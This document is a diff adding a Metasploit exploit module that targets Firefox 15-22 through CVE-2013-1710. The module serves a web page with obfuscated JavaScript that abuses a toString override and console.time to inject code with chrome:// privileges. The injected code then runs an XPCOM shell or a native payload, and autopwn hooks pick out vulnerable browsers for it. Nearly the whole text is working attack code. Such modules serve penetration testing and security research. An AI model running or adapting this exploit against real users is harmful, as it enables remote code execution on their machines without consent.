@@ -1,0 +1,103 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+require 'rex/exploitation/jsobfu'
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::BrowserExploitServer
+  include Msf::Exploit::Remote::BrowserAutopwn
+  include Msf::Exploit::Remote::FirefoxPrivilegeEscalation
+
+  autopwn_info({
+    :ua_name    => HttpClients::FF,
+    :ua_minver  => "15.0",
+    :ua_maxver  => "22.0",
+    :javascript => true,
+    :rank       => ExcellentRanking
+  })
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Firefox toString console.time Privileged Javascript Injection',
+      'Description'    => %q{
+        This exploit gains remote code execution on Firefox 15-22 by abusing two separate
+        Javascript-related vulnerabilities to ultimately inject malicious Javascript code
+        into a context running with chrome:// privileges.
+      },
+      'License' => MSF_LICENSE,
+      'Author'  => [
+        'moz_bug_r_a4', # discovered CVE-2013-1710
+        'Cody Crews',   # discovered CVE-2013-1670
+        'joev' # metasploit module
+      ],
+      'DisclosureDate' => "May 14 2013",
+      'References' => [
+        ['CVE', '2013-1710']  # chrome injection
+      ],
+      'Targets' => [
+        [
+          'Universal (Javascript XPCOM Shell)', {
+            'Platform' => 'firefox',
+            'Arch' => ARCH_FIREFOX
+          }
+        ],
+        [
+          'Native Payload', {
+            'Platform' => %w{ java linux osx solaris win },
+            'Arch'     => ARCH_ALL
+          }
+        ]
+      ],
+      'DefaultTarget' => 0,
+      'BrowserRequirements' => {
+        :source  => 'script',
+        :ua_name => HttpClients::FF,
+        :ua_ver  => lambda { |ver| ver.to_i.between?(15, 22) }
+      }
+    ))
+
+    register_options([
+      OptString.new('CONTENT', [ false, "Content to display inside the HTML <body>.", "" ])
+    ], self.class)
+  end
+
+  def on_request_exploit(cli, request, target_info)
+    send_response_html(cli, generate_html(target_info))
+  end
+
+  def generate_html(target_info)
+    key = Rex::Text.rand_text_alpha(5 + rand(12))
+    opts = { key => run_payload } # defined in FirefoxPrivilegeEscalation mixin
+
+    js = js_obfuscate %Q|
+      var opts = #{JSON.unparse(opts)};
+      var key = opts['#{key}'];
+      var y = {}, q = false;
+      y.constructor.prototype.toString=function() {
+        if (q) return;
+        q = true;
+        crypto.generateCRMFRequest("CN=Me", "#{Rex::Text.rand_text_alpha(5 + rand(12))}", "#{Rex::Text.rand_text_alpha(5 + rand(12))}", null, key, 1024, null, "rsa-ex");
+        return 5;
+      };
+      console.time(y);
+    |
+
+    %Q|
+      <!doctype html>
+      <html>
+        <body>
+          <script>
+            #{js}
+          </script>
+          #{datastore['CONTENT']}
+        </body>
+      </html>
+    |
+  end
+end
+
